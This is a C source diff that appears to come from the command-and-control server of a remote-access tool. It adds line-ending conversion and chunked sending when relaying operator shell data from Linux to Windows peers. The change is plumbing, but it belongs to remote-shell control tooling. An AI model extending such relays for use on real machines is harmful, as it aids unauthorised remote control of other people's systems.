@@ -1,4 +1,5 @@
 #include "lerror.h"
+#include "lmem.h"
 #include "cnc.h"
 #include "cpanel.h"
 
@@ -143,8 +144,45 @@ void laikaC_handleAuthenticatedShellData(struct sLaika_peer *authPeer, LAIKAPKT_
     /* read data */
     laikaS_read(&authPeer->sock, data, sz);
 
-    /* forward data to peer */
-    laikaS_startVarPacket(peer, LAIKAPKT_SHELL_DATA);
-    laikaS_write(&peer->sock, data, sz);
-    laikaS_endVarPacket(peer);
+    if (authPeer->osType == peer->osType) {
+        /* forward raw data to peer */
+        laikaS_startVarPacket(peer, LAIKAPKT_SHELL_DATA);
+        laikaS_write(&peer->sock, data, sz);
+        laikaS_endVarPacket(peer);
+    } else if (authPeer->osType == OS_LIN && peer->osType == OS_WIN) { /* convert data if its linux -> windows */
+        uint8_t *buf = NULL;
+        int i, count = 0, cap = 2;
+
+        /* convert line endings */
+        for (i = 0; i < sz; i++) {
+            laikaM_growarray(uint8_t, buf, 2, count, cap);
+
+            switch (data[i]) {
+                case '\n':
+                    buf[count++] = '\r';
+                    buf[count++] = '\n';
+                    break;
+                default:
+                    buf[count++] = data[i];
+            }
+        }
+
+        /* send buffer (99% of the time this isn't necessary, but the 1% can make
+            buffers > LAIKA_SHELL_DATA_MAX_LENGTH. so we send it in chunks) */
+        i = count;
+        while (i > LAIKA_SHELL_DATA_MAX_LENGTH) {
+            laikaS_startVarPacket(peer, LAIKAPKT_SHELL_DATA);
+            laikaS_write(&peer->sock, buf + (count - i), LAIKA_SHELL_DATA_MAX_LENGTH);
+            laikaS_endVarPacket(peer);
+            
+            i -= LAIKA_SHELL_DATA_MAX_LENGTH;
+        }
+
+        /* send the leftovers */
+        laikaS_startVarPacket(peer, LAIKAPKT_SHELL_DATA);
+        laikaS_write(&peer->sock, buf + (count - i), i);
+        laikaS_endVarPacket(peer);
+
+        laikaM_free(buf);
+    }
 }
